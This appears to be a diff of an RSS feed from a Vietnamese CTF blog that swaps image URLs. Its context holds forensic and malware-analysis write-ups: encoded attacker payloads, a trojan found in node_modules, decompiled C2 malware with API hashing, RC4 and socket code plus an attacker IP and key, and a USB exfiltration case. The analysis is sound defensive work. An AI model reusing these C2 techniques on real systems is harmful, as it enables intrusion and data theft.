&quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQEJFZmxJWXtYViNzdCRBLUwoVXNHXXdSe3pIVGZBGhUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1/YGhYNmp1Wll4TEEnf0lJWXJHSSp0RWppSHxxF0dKGGVDd3l+QHJVDgkVCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQE1FfG5JZ3xyfEF4cF5Gf0lJWXV4Rk1MeHppXXx+TEdie0QRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRMRUZvQE1Rem5nTXpwVVVtXFF7bVBSSXB4Vk4WYkUeGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTXxzf15zRUVVcnhdXWVUWCtHQ091EEFlT1pzckdKTh19SWtldUB+Z1gFGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTXpwSlF7T05dKENCcyxRc1lXQmV1UX9lT0RLR2ZcbkkSDREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRMRUZvQEJBYGlGWWlze1F9cE5FdHpjc3Z8Rl1Pe3ppFH9+Txhie0QRDRAREFdbX1EbQk9M&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRkQT58U1lKNURGQSFIfFFtdyRZdHopVmlHLEkQQxF1FEZucRhiaWFAdBxHRnhxZQVWBGFBWnJxSmdTUzMbERYtDhcodWl0dWwrJyM1fyYrIA==&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfa2t7U1xJZGlJZ2pYViNzQmF4JTkkJTx7d3NFD1ZbUA==&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvXUNCVW55WSZXaEtUbwUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvXXsoVS1/SUlVRWpuTWlnSBUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvXXspf2l/WSZIe2puTWlnSBUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvVn1CVWxEZ1ZTYkUeGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvSXhNVSx5RlVMQltqV2ZBGhUJFBUMS0dDVR9GS0A=&quot;,  &quot;ZWJqbCRMRUZvQE1jem9ZWndaa1J9TVBvT3hNSXB/LVJJbWNMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRdV2g1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRGYTo1KTQ1LGtnY3U/Zmtg&quot;,  &quot;ZWJqbCRfaz5xQEJJZGlJaHdwRSdzT3t7a0NMWXR5WXdabkVMGQUYGQhPQ0dJA1pXRA==&quot;,  &quot;ZWJqbCRMRUZvQE1Rem5nTWlzICokWVVVc3hCUWZRXV1NQHVbSEZfZVhLQ2laTlcaA2hlS0Z+fnVQXX1cTHJZUH1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTWdISkF7XFInf3p3Imp5XSpaQmVbVEFlT15KUx5Wd3ZuQHJVDgkVCAkYX1NXWRNKRzQ=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTX1zIVpzdlFvcHhNLlt8SWdMaGVPUWxhfVhLbX1WYklADREMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzdEFOf1JbdCE9ICEAR0tPQQtSX1w=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWW9ESXNVc09PV391ZkB5eWpFd2l5SlABYUJWdQJIW1dQVX5ZAn1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdXWlHXV1XQ2VlVEdNfVhLbX5LZHofV3hfdkFWflxRel0GAR0AAWAnKy8hazI/PA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdXWlHXV1XQ2VlVEdNfVhLbX5LZHofV3hffQZtTHZPdGkOV18NbTQIJSx5ZXh5aC8jJyljOjck&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXkJ4UzkkJTx7d3NFD1ZbUA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWW9ESXNVc09PV391ZhFgYmFaTx1+V3pLcl1tcEBRcHlIW155RyggFXYDJBE/JAotdnFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWWV8SSoQamphV3xxS117R0dfd31EexEMDRRTX1tdF05DSA==&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSf2x5WXhHQxFhSEdPT19LbW1cT0V1QFN1Zkd8dX1BYFNyTHR5eToIBRk0JwESfgotdnFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BZWntUXV1XQ2VlVEdIdURMYnpLfX1tXVBlS1h5WH1UYG1qU3ZvUH1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdVWx+WXdMQk5xSEBudk95eWlAT0NhSVRqcQR+fnVLYG1XSVl5aXQlATQjJHQRfQIbJHFtcHFwNzs/MXsiLyw=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BdImZRcFVMQ3UaFn91T19LbW1cT0V1QFN1ZkR2UQoFGQQFHFtXUyVvNjsw&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSf2x5WXhHQxFhSEdPT19LbW1cT0V1QFN1ZlN+T3ZRdVdtSWRHdjMIAQl3HC8OOAANDTYECRUgMxUGYhYxamV5ZGV8OzczBU8WGxA=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BZWntUXV1NQHVbSGlIQ1FIcnlAZmlhQFJ1W1hWWmVUXHJqTH5ZAn1hfH1kIy8rLWc+Mzg=&quot;,  &quot;ZWJqbCRMRUZvQElKa0RNTndYUVJzXFVWf1BSWWV8SSoQamFIbwUYGQhPQ0dJA1pXRA==&quot;,  &quot;cHh2a2trJiprKShiYX1hfWQxcHJncCAjIzl1a3lzNjhBD1JaAwkGAF9LDQICWlxGRFReWlpQRR9aWEleCgkQXXZ1JiYnKiIiYCUjJSljKyEzPjY2fHx/d3N5OHwAM3l/Bg4QQwgMCAJIAARLAx0LAVhWFBoYEFgDAA1dV1xaDFipqKA=&quot;,  &quot;cHh2a2trJmYmeXMrKisua3V9MnI6ZW8=&quot;, &quot;QzteVndgdHRUamJqYGFrYXd0TldxZn1jd2lGVnV+bHBTTkRXBGBCQE0HRkVHICQiOnIIb2FGU0VLZVlTXVFSWi4mJx8AKiUyJSwkPz8RJyIgPiAnNTsieSIwKlZWUFQcWj03EAEXFTsLAQsHAAgACBUtNhwDGxoYGR0JJxoUEhqu9fr3iY+LjQ==&quot;, &quot;ZWJqbCRhaWltKQ==&quot;, &quot;ZG5sZiQIDA==&quot;]
@@ -2313,7 +2313,7 @@ for payload in enc:
   dec = decrypt(payload)
   print(dec)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByJ4euGVlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/ByJ4euGVlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 2 : whoami&lt;/h3&gt;
 &lt;h2&gt;Question 3&lt;/h2&gt;
 &lt;p&gt;tôi sẽ lưu lại script a.py và đọc source của nó
@@ -2370,7 +2370,7 @@ for suffix in itertools.product(charset, repeat=4):
         break
 
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyrxV_M4xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HyrxV_M4xg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 3 : fA3bDtz8z7&lt;/h3&gt;
 &lt;h2&gt;Question 4:&lt;/h2&gt;
 &lt;p&gt;Sau khi decrypt file inpomtant nó đã bị bảo mật
@@ -2379,17 +2379,17 @@ hash md5 của file important.zip&lt;/p&gt;
 &lt;h2&gt;Question 5&lt;/h2&gt;
 &lt;p&gt;Kiểm tra web browser của user ta thấy có BraveSoftware extract file History , Folder Path : %AppData%\Local\BraveSoftware\User Data\Default\History&lt;/p&gt;
 &lt;p&gt;sử dụng các trình đọc database
-&lt;img src=&quot;https://hackmd.io/_uploads/SJFtzuzVle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SJFtzuzVle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 5 : https://pastebin.com/qPsjHKrW&lt;/h3&gt;
 &lt;h2&gt;Question 6:&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r116GdGNgg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/r116GdGNgg.png&quot; alt=&quot;image&quot; /&gt;
 Trang pastebin đã bị locked đã đến lúc sử dụng đến file memory
 check ProcessList ta thấy có process NotePad.exe với PID = 6876
 ở câu hỏi này tôi đã mất thời gian rất lâu để tìm ra tôi đã được Author gợi ý cho Heap Allocations và blog để tìm hiểu về điều này
 https://www.sans.org/blog/the-analysis-of-user-data-in-VADs-extraction-of-precise-data-in-notepad-memory-and-hunting-for-malware-behavior/&lt;/p&gt;
 &lt;p&gt;Tôi sử dụng MemProcFS để convert .mem to .dmp chuẩn định dạng crash dump cho WinDBG&lt;/p&gt;
 &lt;p&gt;attach Process debug với Notepad.exe
-&lt;img src=&quot;https://hackmd.io/_uploads/BJKKN_z4ll.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BJKKN_z4ll.png&quot; alt=&quot;image&quot; /&gt;
 sau đó list các VADs Heap allocation của tiến trình này&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;!heap -s -v -a
 &lt;/code&gt;&lt;/pre&gt;
@@ -2398,7 +2398,7 @@ sau đó list các VADs Heap allocation của tiến trình này&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;allocation này có vẻ như đã bị giải phóng. Ta chỉ còn cách dump toàn bộ FirstEntry-LastValid  Entry của heap allocation để check&lt;/p&gt;
 &lt;p&gt;sau khi thực hiện như blog ta có offset heap : 000001df84730000
-&lt;img src=&quot;https://hackmd.io/_uploads/HkHOLdzVxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HkHOLdzVxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;dump Heap location này ra và filter với strings + grep tìm password điều này giúp ta giảm tối đã lượng bytes thu hẹp lại chỉ trong phạm vi Heap Allocations FirstEntry&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;db 0x000001df`84730740 L 0xFE8C9
 &lt;/code&gt;&lt;/pre&gt;
@@ -2409,7 +2409,7 @@ FUl i3deXy3QM3
 &lt;h3&gt;Answer 6: i3deXy3QM3&lt;/h3&gt;
 &lt;h2&gt;Question 7:&lt;/h2&gt;
 &lt;p&gt;Dùng mật khẩu unlocked pastebin ta có password file zip
-&lt;img src=&quot;https://hackmd.io/_uploads/H1jEuuGNle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H1jEuuGNle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 7 : KvvO60Zf69Yyq8&lt;/h3&gt;
 </content:encoded></item><item><title>CPCTF2025</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/cpctf2025/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/cpctf2025/</guid><pubDate>Mon, 21 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;CPCTF2025&lt;/h1&gt;
 &lt;h2&gt;Challenge: Event Analyzer&lt;/h2&gt;
@@ -2474,11 +2474,11 @@ EventID:&lt;/p&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;I try to use EvtxCMD.exe and Timeline to hunt malicous script of Windefender log and the eventid 1116 gave me a notice that have a file python to be detected which Trojan&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJb29cMkle.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rJb29cMkle.png&quot; alt=&quot;image&quot; /&gt;
 fullpath : _C:\Users\User\Documents\workspaces\marktype\node_modules@n37scancp\highlight.js\this_is_not_flag.py&lt;/p&gt;
 &lt;p&gt;&quot;I immediately tracked the filesystem, but it seems the file was deleted by the user or attacker. I suspect the file might have been renamed or replaced. I checked the MPLog and found the hash of the file, then submitted it to VirusTotal for dynamic analysis. The result identified it as a trojan, with the file name evil.py
-&lt;img src=&quot;https://hackmd.io/_uploads/ryu439f1ge.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/rJwS2cfyxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/ryu439f1ge.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rJwS2cfyxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Username&apos;s attacker&lt;/h3&gt;
 &lt;p&gt;To get username for applying malicous code
 I was process and extract folder workspace go to marktype repo and read log&lt;/p&gt;
@@ -3184,7 +3184,7 @@ tôi check string thì thấy được ipaddr lạ trong file PE tiến hành xr
   return result;
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyC4oiARJg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HyC4oiARJg.png&quot; alt=&quot;image&quot; /&gt;
 mình đã sử dụng virustotal để nhận diện hash  là fnv nhưng có vẻ không kết thúc tại đó nó còn kết hợp thêm kỹ thuật giống như trong MurmurHash3
 Do không thể giả lập lại hàm hash mà ban đầu tôi đã đề cập sau khoảng thời gian mấy ngày mò docs cũng như tìm hiểu về API ws2_32.dll thì tôi nhận ra cách mà chương trình tạo ra một socket TCP đều dùng các FunctionCall quen thuộc (như send, recv, connect, bind, accept, listen) cùng với các các parameter dễ nhận dạng do đây là một file malware C2 nghi ngờ gửi dữ liệu từ target-attacker và ngược lại nên tôi search các function tạo một TCP connect()
 sau một hồi research
@@ -3356,19 +3356,19 @@ LABEL_9:
 nếu getaddrinfo thất bại chương trình sẽ return về &lt;strong&gt;nonzero hay còn gọi là error code&lt;/strong&gt; sẽ đi tới LABEL_4
 và dùng ExitProcess() để terminal chương trình.
 nếu getaddrinfo thành công return 0
-&lt;img src=&quot;https://hackmd.io/_uploads/SySXdWHA1g.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SySXdWHA1g.png&quot; alt=&quot;image&quot; /&gt;
 và trả về các object của struct attackInfo
 tiếp theo chương trình sẽ tạo một socket với attackrinfo tại v2[116]
-&lt;img src=&quot;https://hackmd.io/_uploads/SyJlcWr01x.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/SyJlcWr01x.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Nếu socket tạo thành công sẽ gọi functionName connect() từ ws2_32.dll đã resolved APIhash với v2[119]
 và v2[120] có thể là closeconnect()
 khi tạo thành công connect() chương trình đi tới LABLE_9 bắt đầu nhận và gửi payload thông qua socket này&lt;/p&gt;
 &lt;h2&gt;tại LABEL_9&lt;/h2&gt;
 &lt;p&gt;nhận diện các functioncall thông qua các parameter thông dụng
-&lt;img src=&quot;https://hackmd.io/_uploads/BJGpkGS0Je.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/BJGpkGS0Je.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;đầu tiên tại target nhận một key với buffer 512 từ attacker
 filter wireshark : ip.addr==192.168.89.136 and tcp.srcport==31337
-&lt;img src=&quot;https://hackmd.io/_uploads/ByWh3ZSRJe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/ByWh3ZSRJe.png&quot; alt=&quot;image&quot; /&gt;
 &lt;strong&gt;key nhận từ attacker : &quot;I&apos;m_4_Gat3_K33per&quot;&lt;/strong&gt;
 target sẽ gửi lại cho attacker 1 byte payload = 4 (do tại bước này mình vẫn chưa hiểu attacker send 1 bytes này làm gì nên mình sẽ giải thích ở dưới sau nếu các bạn thắc mắc hãy kéo xuống dưới)&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;send = resolve_APIhashing_ws2_32();
@@ -3376,7 +3376,7 @@ target sẽ gửi lại cho attacker 1 byte payload = 4 (do tại bước này m
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;theo dõi bên wireshark
 filter wireshark : ip.addr==192.168.89.136 and tcp.dstport==31337
-&lt;img src=&quot;https://hackmd.io/_uploads/HJWF3ZBRJg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HJWF3ZBRJg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;tiếp theo chương trình sử dụng hàm create_key_random((int) &amp;amp;savedregs)) với để tạo khóa&lt;/p&gt;
 &lt;h2&gt;Create_key_random&lt;/h2&gt;
 &lt;pre&gt;&lt;code&gt;int __usercall create_string@&amp;lt;eax&amp;gt;(int a1@&amp;lt;ebp&amp;gt;)
@@ -3432,7 +3432,7 @@ và nó sẽ mã hóa key này với key mà attacker đã gửi đầu tiên v�
 &lt;p&gt;nó sẽ dùng rc4 để encrypt và sử dụng resolve_APIhashing_ws2_32() để lấy functionName : send() từ ws2_32.dll chức năng của hàm resolve_APIhashing_ws2_32 mình đã đề cập ở trên
 đây là payload đã send 4bytes len của key và ngay sau đó là key
 ban đầu tại đây mình nghĩ sẽ tạo ra 2 packet trên file pcapng và mình kh thấy packet nào hợp lệ sau khoảng thời gian mình nhận ra nó đã đc gửi cùng với nhau trong 1 packet và đây là payload của nó
-&lt;img src=&quot;https://hackmd.io/_uploads/BJ3oeGBCyl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BJ3oeGBCyl.png&quot; alt=&quot;image&quot; /&gt;
 vì đây là packet t2 sau khi send 0x04
 payload có 68bytes : chia ra 2 phần&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;encrypted-key-length :86dad7bb 
@@ -3442,7 +3442,7 @@ encrypted-key : 918e87d161556ad2e40a89010adfe3aa41ca44764e786b738047456cc80d021e
 &lt;pre&gt;&lt;code&gt;sizekey = 0x40 = 64bytes đúng với logic tạo key
 key = &quot;WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM&quot;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJyeQzSRJe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HJyeQzSRJe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;có key rồi decrypt luôn payload tiếp theo đã đc gửi từ attacker tới target đầu tiên là len data tiếp theo là data và sau đó bị encrypted bởi rc4_encrypt sau đó có vẻ như nó load file này vào memory và chạy file&lt;/p&gt;
 &lt;h2&gt;Load file Drop (chức năng tinh chỉnh key)&lt;/h2&gt;
 &lt;pre&gt;&lt;code&gt;    recv2 = resolve_APIhashing_ws2_32();
@@ -3467,20 +3467,20 @@ trả về một con trỏ (pointer) đến Entry Point hoặc Base Address củ
 và attacker sẽ import manual các functionName của file PE này vào sử dụng&lt;/p&gt;
 &lt;p&gt;sau khi PEloader thành công attacker đã tạo một file BMP
 và sau đó gửi size của file
-&lt;img src=&quot;https://hackmd.io/_uploads/By4ocMrCkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/By4ocMrCkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;do thời gian gửi payload chênh lệch rất ít nên hàm tạo khóa sẽ cho ra các khóa giống nhau&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;filter wirshark : ip.addr==192.168.89.136 and tcp.dstport==51392 and tcp.srcport==31337
 với gửi len data ở gói packetid == 10
 và data ở gói packetid == 11 trở đi để thuận tiện ta sẽ lấy payload ở TCP stream
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJoXPGH01e.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BJoXPGH01e.png&quot; alt=&quot;image&quot; /&gt;
 download file về&lt;/p&gt;
 &lt;h2&gt;AddVectoredExceptionHandler&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H14ejMSRkl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/H14ejMSRkl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;dword_42039C nó là một APIwindows AddVectoredExceptionHandler
 một dạng bắn ExceptionCode để xử lý logic code thật
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJBwXEH0yl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rJBwXEH0yl.png&quot; alt=&quot;image&quot; /&gt;
 sau khi fix&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)
 {
@@ -3671,7 +3671,7 @@ with open(&quot;pic.bmp&quot;, &quot;wb&quot;) as f:
 
 
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SyEdvv0Rkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SyEdvv0Rkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;PS: Cảm ơn mọi người đã đọc và cảm ơn author vì qua challenge này mình học thêm được rất nhiều thứ mới lạ.&lt;/p&gt;
 </content:encoded></item><item><title>Diskfiltrate</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/diskfiltrate/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/diskfiltrate/</guid><pubDate>Thu, 17 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;DiskFiltration&lt;/h1&gt;
 &lt;blockquote&gt;
@@ -3680,7 +3680,7 @@ Category : DFIR Live Endpoint
 Artifact: C:\Users\Administrator\Documents\New Folder\Liam&apos;s Disk
 Description:
 Tech THM discovered their critical data had been leaked to the competitors. After an internal investigation, the company suspects Liam, a recently terminated employee who was working as a system engineer with Tech THM. This suspicion was raised as Liam had access to the leaked data in his company-provided workstation. He often worked late hours without clear justification for his extended presence. He was also caught roaming around the critical server room and taking pictures of the entry gate. Following these suspicions, Liam’s workstation (provided by the company) was investigated. The initial investigation suggests that an external entity was also helping Liam.
-&lt;img src=&quot;https://hackmd.io/_uploads/ryYEYpSyxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/ryYEYpSyxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2&gt;Question 1: What is the serial number of the USB device Liam used for exfiltration?&lt;/h2&gt;
 &lt;p&gt;check file disk.E01 with autopsy
@@ -3699,7 +3699,7 @@ USB đc mount vào ở E&lt;/li&gt;
 &lt;h2&gt;Question 3:What is the name of the zip file Liam copied from the USB to the machine for exfiltration instructions?&lt;/h2&gt;
 &lt;p&gt;Check data transfer between USB and disk
 After identifying that the USB is mounted to drive E, check the RecentDocs in Autopsy to see if there are any suspicious files belonging to E:.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SynGtAHJxx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SynGtAHJxx.png&quot; alt=&quot;image&quot; /&gt;
 Access the path to check: /img_dis.E01/vol_vol3/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/f01b4d95cf55d32a.automaticDestinations-ms/Exfiltration Plan.lnk
 Using LECmd.exe to check, this .lnk file points to the folder E:\Exfiltration Plan.&lt;/p&gt;
 &lt;p&gt;Information LNK folder Exfiltration Plan&lt;/p&gt;
@@ -3917,7 +3917,7 @@ check this file for pasword unzip file Shadow_Plan.zip&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2&gt;Question 5:Time to reveal the external entity helping Liam! Who is the author of the PDF file stored in the zip file?&lt;/h2&gt;
 &lt;p&gt;Conducting unzip file with password and check signature metadata của file pdf&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk-hZgL1eg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rk-hZgL1eg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Answer: Henry&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -3938,7 +3938,7 @@ confidential: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced
 &lt;p&gt;At the Question 1, we identified to USB mounting into E:\ on local Disk
 the one of them which we found out in Question 3 : E:\Exfiltration Plan
 the other which we&apos;ll check it in RecentDocs of  AutoPsy
-&lt;img src=&quot;https://hackmd.io/_uploads/rk5KBx8kel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/rk5KBx8kel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;--- Header ---
   Target created:  2025-01-18 08:28:07
   Target modified: 2025-01-29 11:20:44
@@ -4078,7 +4078,7 @@ Megapixels                      : 0.480
 &lt;/blockquote&gt;
 &lt;h2&gt;Question 10: It seems like Liam caused one last damage before leaving. When did Liam delete &quot;Tax Records.docx&quot;? (YYYY-MM-DD HH:MM:SS)&lt;/h2&gt;
 &lt;p&gt;I dumped $LogFile and $UsnJrnl Log to analysis activity of attacker about deleted, created, modified files&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkeMev4L1ee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SkeMev4L1ee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;0x00CF8A40|128574|128574||244969960|244969935|DeleteIndexEntryAllocation|AddIndexEntryAllocation|0|Tax Records.docx|$INDEX_ALLOCATION:$I30|;MftRef=132649;MftSeqNo=1;See LogFile_INDX_I30.csv|||||||2025-01-17 12:47:20.0000000|2025-01-17 12:47:19.7822537|2025-01-20 08:17:47.9082253|2025-01-20 08:17:47.9082253|||||||||||||16384|15445|archive|WIN32|||||||||0|0|120|0x00000000|1|0x00000068|0x0003|0x0B80|0x0001|1616|0x0000|0x00000000|0x0024E2E3|0|0|0
 0x00CF9050|132649|||244969994|244969960|DeallocateFileRecordSegment|InitializeFileRecordSegment|0|Tax Records.docx||||||||||||||||||||||||||||||||||||||0|24|0x00000000|1|0x00000068|0x0002|0x0018|0x0001|0|0x0002|0x0000818A|0x000C818A|-1|0|0
 0x00CF91B8|90831|90831||244970039|244970020|UpdateNonResidentValue|Noop|1792|Tax Records.docx|$DATA:$J|;$UsnJrnl|Tax Records.docx|132649|128574|2025-01-29 11:29:02.6974651|FILE_DELETE+CLOSE|7612160||||||||||||||||||||||||||||||96|0|0x00000000|1|0x00000068|0x0004|0x0068|0x0001|0|0x0000|0x00000742|0x000181BD|0|0|0
@@ -4158,34 +4158,34 @@ Press Enter to exit...
 &lt;/code&gt;&lt;/pre&gt;
